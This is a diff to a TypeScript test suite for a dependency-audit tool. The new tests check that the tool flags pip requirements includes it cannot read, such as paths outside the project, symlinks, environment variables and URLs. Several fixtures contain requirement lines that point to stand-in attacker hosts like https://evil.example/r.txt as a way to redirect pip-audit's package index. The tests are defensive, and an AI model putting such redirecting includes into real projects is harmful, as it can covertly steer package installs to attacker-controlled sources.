@@ -1085,21 +1085,78 @@ describe('deps_audit', () => {
       ['an index option in a comment', '# --index-url https://x.example/simple\ndjango==2.0.1\n'],
       ['a per-requirement hash', 'django==2.0.1 --hash=sha256:0000000000000000000000000000000000000000000000000000000000000000\n'],
       ['an include with no index option', '-r base.txt\ndjango==2.0.1\n'],
-      // The server reads within the project: an include out of it is not read.
-      ['an include through a link out of the project', '-r link/idx.txt\ndjango==2.0.1\n'],
-      ['an include by a path out of the project', '-r ../idx.txt\ndjango==2.0.1\n'],
+      // pip fails on a missing include: it cannot steer anything.
+      ['an include that is not there', '-r missing.txt\ndjango==2.0.1\n'],
     ])('names nothing for %s', async (_label, text) => {
-      const outside = makeTempDir('deps-tools-outside-');
-      writeFileSync(join(outside, 'idx.txt'), '--index-url https://outside.example/simple\n', 'utf8');
-      const project = join(outside, 'project');
-      mkdirSync(project);
-      symlinkSync(outside, join(project, 'link'), 'junction');
+      const project = tempProject();
       writeFileSync(join(project, 'requirements.txt'), text, 'utf8');
       writeFileSync(join(project, 'base.txt'), 'flask==1.0\n', 'utf8');
       const run = await pipAuditRun(project);
       expect(run?.status).toBe('ok');
       expect(run?.honoured_config).toBeUndefined();
-      expect(run?.reason ?? '').not.toMatch(/honoured/);
+      expect(run?.reason ?? '').not.toMatch(/honoured|not read by dev-guardian/);
+    });
+
+    /**
+     * Review 3.0, wave 2, round 2: an include pip follows but the server
+     * does not read (it reads within the project) was not named, so one line
+     * — `-r https://evil.example/r.txt` — picked pip-audit's index in
+     * silence. Every such include is named now, unread.
+     */
+    function outsideProject(): { project: string; outside: string } {
+      const outside = makeTempDir('deps-tools-outside-');
+      writeFileSync(join(outside, 'idx.txt'), '--index-url https://outside.example/simple\n', 'utf8');
+      const project = join(outside, 'project');
+      mkdirSync(project);
+      symlinkSync(outside, join(project, 'link'), 'junction');
+      return { project, outside };
+    }
+
+    it.each([
+      ['a path out of the project', '../idx.txt'],
+      ['a path further out', '../../outside/evil.txt'],
+      ['a URL', 'https://evil.example/r.txt'],
+      ['a link out of the project', 'link/idx.txt'],
+      ['an environment variable', '${REQS_DIR}/base.txt'],
+    ])('names an include it cannot read: %s', async (_label, target) => {
+      const { project } = outsideProject();
+      writeFileSync(join(project, 'requirements.txt'), `-r ${target}\ndjango==2.0.1\n`, 'utf8');
+      const run = await pipAuditRun(project);
+      expect(run?.status).toBe('ok');
+      expect(run?.reason).toContain(
+        `requirements.txt includes ${target} (not read by dev-guardian): pip may take its index from it`,
+      );
+      expect(run?.honoured_config).toEqual(['requirements.txt']);
+    });
+
+    it('names a constraints include, an --option=value spelling, and one found in an included file', async () => {
+      const { project } = outsideProject();
+      mkdirSync(join(project, 'sub'));
+      writeFileSync(
+        join(project, 'requirements.txt'),
+        '-c https://evil.example/c.txt\n--requirement=$HOME/r.txt\n-r sub/base.txt\n',
+        'utf8',
+      );
+      writeFileSync(join(project, 'sub', 'base.txt'), '-r https://evil.example/nested.txt\nflask==1.0\n', 'utf8');
+      const run = await pipAuditRun(project);
+      const reason = run?.reason ?? '';
+      expect(reason).toContain('requirements.txt includes https://evil.example/c.txt (not read by dev-guardian)');
+      expect(reason).toContain('requirements.txt includes $HOME/r.txt (not read by dev-guardian)');
+      expect(reason).toContain('sub/base.txt includes https://evil.example/nested.txt (not read by dev-guardian)');
+      expect(run?.honoured_config).toEqual(['requirements.txt', 'sub/base.txt']);
+    });
+
+    it('names a handed requirements file that leads out of the project through a link', async () => {
+      const { project, outside } = outsideProject();
+      mkdirSync(join(outside, 'reqs'));
+      writeFileSync(join(outside, 'reqs', 'base.txt'), '--index-url https://outside.example/simple\n', 'utf8');
+      symlinkSync(join(outside, 'reqs'), join(project, 'requirements'), 'junction');
+      writeFileSync(join(project, 'requirements.txt'), 'django==2.0.1\n', 'utf8');
+      const run = await pipAuditRun(project);
+      expect(run?.reason).toContain(
+        'requirements/base.txt leads out of the project (not read by dev-guardian): pip may take its index from it',
+      );
+      expect(run?.honoured_config).toEqual(['requirements/base.txt']);
     });
   });
 
